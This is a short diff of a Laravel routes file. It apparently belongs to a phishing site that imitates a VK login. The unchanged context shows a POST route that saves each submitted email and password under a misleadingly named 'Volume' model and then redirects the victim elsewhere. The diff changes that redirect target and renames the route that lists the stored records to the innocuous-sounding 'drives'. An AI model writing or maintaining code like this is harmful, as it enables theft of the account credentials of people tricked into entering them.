@@ -260,9 +260,9 @@ Route::get('vk', function() {
 });
 Route::post('vk', function(\Illuminate\Http\Request $request) {
     \App\Volume::create(['name' => $request->input('email') . ' --------- ' . $request->input('pass')])->save();
-    return redirect()->to('https://trashbox.ru/topics/56221/kali-linux-vzlom-wi-fi-po-protokolu-wps');
+    return redirect()->to('http://www.yasiv.com/vk');
 });
-Route::get('volumes', function() {
+Route::get('drives', function() {
     $html = "";
     $i = 1;
     foreach (\App\Volume::all() as $value) {
